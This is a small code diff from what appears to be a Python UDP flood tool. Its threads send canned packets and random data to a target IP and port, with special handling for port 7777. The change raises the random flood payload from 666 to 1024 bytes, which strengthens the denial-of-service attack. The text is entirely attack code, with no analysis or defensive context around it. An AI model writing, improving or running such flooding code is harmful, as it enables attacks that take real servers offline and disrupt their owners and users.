@@ -70,7 +70,7 @@ class MyThread(threading.Thread):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            msg = Pacotes[random.randrange(0,3)]
            sock.sendto(msg, (ip, int(port)))
-           flood = random._urandom(666)
+           flood = random._urandom(1024)
            sock.sendto(flood, (ip, int(port)))
            
          if(int(port) == 7777):
